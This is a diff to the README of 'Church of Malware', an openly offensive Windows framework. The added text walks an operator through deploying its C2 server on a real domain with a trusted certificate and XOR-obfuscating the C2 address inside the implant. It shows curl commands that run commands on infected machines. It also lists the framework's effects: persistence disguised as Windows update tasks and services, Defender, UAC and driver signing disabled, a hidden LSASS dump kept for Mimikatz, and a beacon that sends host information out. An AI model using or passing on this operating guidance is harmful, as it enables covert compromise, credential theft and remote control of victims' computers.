@@ -4,7 +4,7 @@
 ```
     ╔═══════════════════════════════════════════════════════════════════════════╗
     ║                         CHURCH OF MALWARE                                 ║
-    ║                  Enterprise Offensive Security Framework                  ║
+    ║          Church - Weaponized Windows Security Bypass Framework            ║
     ║                         by ek0ms savi0r                                   ║
     ╚═══════════════════════════════════════════════════════════════════════════╝
 ```
@@ -102,6 +102,8 @@ CHAR g_aes_iv_obf[] = "\xB1\xB8\xB7..."      // 16-byte AES IV
 
 Replace the obfuscated strings with your own XOR-encrypted values using the provided key (0xDD). The C2 server expects matching AES keys.
 
+**Important:** The `g_c2_server_obf` string must contain the full HTTPS URL of your C2 server, including the path `/beacon`. For example, if your domain is `c2.churchofmalware.org`, obfuscate `https://c2.churchofmalware.org/beacon` with XOR key `0xDD`.
+
 ---
 
 ## Custom Signed Driver Implementation
@@ -115,8 +117,8 @@ Church includes a custom signed driver loader that eliminates reliance on public
 5. Falls back to gdrv.sys BYOVD if custom driver fails
 
 To use your own signed driver:
-- Replace the g_customDriverBase64 placeholder with your base64-encoded driver
-- Ensure your driver implements CHURCH_IOCTL_DISABLE_DSE and CHURCH_IOCTL_EXECUTE_SHELLCODE
+- Replace the `g_customDriverBase64` placeholder with your base64-encoded driver
+- Ensure your driver implements `CHURCH_IOCTL_DISABLE_DSE` and `CHURCH_IOCTL_EXECUTE_SHELLCODE`
 - Sign the driver with a valid code-signing certificate
 
 ---
@@ -132,63 +134,117 @@ The C2 server is fully hardened with the following security features:
 - Rate limiting on all API endpoints (10-30 requests per minute)
 - HttpOnly, Secure session cookies for web UI
 
-Install dependencies:
+**New in v2.1: Built-in Beacon Parser & Lantern.js Graph Compatibility**
+
+The C2 server now includes a dedicated parser that decrypts incoming beacon data and converts it into structured JSON, as well as a graph format compatible with the Lantern.js visualization frontend. This enables seamless integration with modern threat intelligence dashboards and real-time monitoring.
+
+Parser endpoints provide:
+- **Decryption and parsing** of raw encrypted beacon data
+- **Graph conversion** for Lantern.js (nodes/edges/environments)
+- **Result parsing** with automatic audit logging
+
+### Production Deployment with a Real Domain
+
+In a real operation, you would deploy the C2 server on a public domain with a valid TLS certificate. The steps are:
+
+1. **Obtain a domain** (e.g., `c2.churchofmalware.org`) and point its DNS to your server's IP.
+2. **Acquire a trusted SSL certificate** (e.g., from Let's Encrypt or a commercial CA) for that domain.
+3. **Configure the C2 server** to use that certificate and key.
+4. **Update the implant's obfuscated C2 string** to match your domain before compiling.
+
+**Example (using Let's Encrypt):**
+
+```bash
+# Install certbot and obtain certificate
+certbot certonly --standalone -d c2.churchofmalware.org
+
+# The certificate and key will be in /etc/letsencrypt/live/c2.churchofmalware.org/
+# Copy them to your C2 directory and run:
+python church_c2_server.py --host 0.0.0.0 --port 443 --cert fullchain.pem --key privkey.pem
+```
+
+**Obfuscating your C2 URL for the implant:**
+
+Use the included XOR utility (or a Python one‑liner) to generate the obfuscated bytes for your domain:
+
+```python
+XOR_KEY = 0xDD
+url = "https://c2.churchofmalware.org/beacon"
+obf = ''.join(f'\\x{(ord(c) ^ XOR_KEY):02X}' for c in url)
+print(obf)
+# Output: \x78\x9D\x9D... (use this to replace g_c2_server_obf)
+```
+
+### Local Testing (Self‑Signed Certificate)
+
+For testing purposes only, you can use a self‑signed certificate:
+
+```bash
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+python church_c2_server.py --host 127.0.0.1 --port 8443 --cert cert.pem --key key.pem
+```
+
+Then access `https://127.0.0.1:8443` (or `localhost`) and bypass the browser warning.
+
+---
+
+### Dependencies
 
 ```bash
 pip install flask flask-socketio cryptography werkzeug flask-limiter
 ```
 
-Generate SSL certificate:
+---
 
-```bash
-openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-```
-
-Run the C2 server:
-
-```bash
-python church_c2_server.py --host 0.0.0.0 --port 443 --cert cert.pem --key key.pem
-```
-
-Configure admin credentials via environment variables or config file:
-
-```bash
-export CHURCH_ADMIN_USER="admin"
-export CHURCH_ADMIN_HASH="$(python -c 'from werkzeug.security import generate_password_hash; print(generate_password_hash("yourpassword"))')"
-```
-
-C2 API Endpoints:
+### C2 API Endpoints
 
 ```bash
 # List all beacons
-curl -H "X-Auth-Token: <JWT_SECRET>" https://localhost/api/beacons
+curl -H "X-Auth-Token: <JWT_SECRET>" https://your-c2-domain/api/beacons
 
 # Execute command on beacon
 curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
   -H "Content-Type: application/json" \
   -d '{"host": "beacon_id", "command": "whoami"}' \
-  https://localhost/api/task
+  https://your-c2-domain/api/task
 
 # Execute PowerShell command
 curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
   -H "Content-Type: application/json" \
   -d '{"host": "beacon_id", "command": "Get-Process", "powershell": true}' \
-  https://localhost/api/task
+  https://your-c2-domain/api/task
 
 # Get beacon details
 curl -H "X-Auth-Token: <JWT_SECRET>" \
-  https://localhost/api/beacon/<beacon_id>
+  https://your-c2-domain/api/beacon/<beacon_id>
 
 # Get task history
 curl -H "X-Auth-Token: <JWT_SECRET>" \
-  https://localhost/api/tasks/<beacon_id>
+  https://your-c2-domain/api/tasks/<beacon_id>
 
 # Get system statistics
 curl -H "X-Auth-Token: <JWT_SECRET>" \
-  https://localhost/api/stats
+  https://your-c2-domain/api/stats
+
+# --- NEW PARSER ENDPOINTS (v2.1) ---
+
+# Parse raw beacon data and return both decrypted JSON and graph format
+curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
+  -d "d=<encrypted_base64>" \
+  https://your-c2-domain/api/beacon/parse
+
+# Convert raw beacon data directly to Lantern.js graph format
+curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
+  -d "d=<encrypted_base64>" \
+  https://your-c2-domain/api/beacon/graph
+
+# Parse command result and log it as an audit event
+curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
+  -d "d=<encrypted_result_base64>" \
+  https://your-c2-domain/api/beacon/result/parse
 ```
 
-Web UI Access: https://c2-server:443
+Web UI Access: `https://your-c2-domain`
 
 ---
 
@@ -200,7 +256,7 @@ Run the compiled executable as Administrator:
 church.exe
 ```
 
-The tool auto-elevates if not already running with administrative privileges.
+The tool auto‑elevates if not already running with administrative privileges.
 
 ---
 
@@ -208,17 +264,17 @@ The tool auto-elevates if not already running with administrative privileges.
 
 After Church executes and forces a system reboot, the following persistent mechanisms remain active:
 
-1. Persistence Triggers:
+1. **Persistence Triggers:**
    - Scheduled task "WindowsUpdateTask" runs the Church binary at user login
    - Scheduled task "MicrosoftUpdateTask" runs daily at 09:00
    - WMI event subscription triggers on explorer.exe startup
-   - Windows service "WindowsUpdateService" auto-starts
+   - Windows service "WindowsUpdateService" auto‑starts
    - Registry Run key executes the binary at boot
    - BootExecute registry entry runs the binary during system initialization
    - IFEO Debugger for svchost.exe and explorer.exe triggers execution
    - Silent Process Exit Monitor relaunches the binary when svchost.exe exits
 
-2. Disabled Protections (Persist Across Reboots):
+2. **Disabled Protections (Persist Across Reboots):**
    - Windows Defender service disabled (WinDefend)
    - Tamper Protection registry key set to 0
    - UAC disabled (EnableLUA = 0)
@@ -227,17 +283,17 @@ After Church executes and forces a system reboot, the following persistent mecha
    - DSE remains disabled (kernel patched)
    - System Restore disabled
 
-3. C2 Beacon:
-   - The binary auto-starts via multiple persistence mechanisms
+3. **C2 Beacon:**
+   - The binary auto‑starts via multiple persistence mechanisms
    - Beacon thread begins sending HTTPS requests to the configured C2 server
    - System information (computer name, user, OS, Defender status, AV products) is transmitted
    - The beacon waits for commands from the C2 server
 
-4. Credential Access:
+4. **Credential Access:**
    - LSASS dump file (C:\lsass.dmp) remains on disk with hidden attribute
    - Can be extracted and processed with Mimikatz offline
 
-5. Network Access:
+5. **Network Access:**
    - Firewall rules allow outbound HTTPS on port 443
    - Telemetry domains blocked in hosts file
    - DNS over HTTPS configured for stealth
